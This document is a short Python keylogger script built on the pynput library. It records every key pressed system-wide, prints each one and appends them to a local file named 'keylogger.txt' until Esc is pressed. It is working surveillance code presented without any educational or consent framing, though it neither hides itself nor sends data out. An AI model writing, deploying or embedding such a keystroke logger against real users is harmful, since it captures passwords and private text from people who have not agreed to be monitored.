import pynput

from pynput.keyboard import Key, Listener

count = 0
Keys = []


def on_press(key):
    global Keys, count

    Keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 1:
        count = 0
        write_file(Keys)
        Keys = []


def on_release(key):
    if key == Key.esc:
        return False


def write_file(keys):
    with open("keylogger.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n\n')
            elif k.find("Key") == -1:
                f.write(k)


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
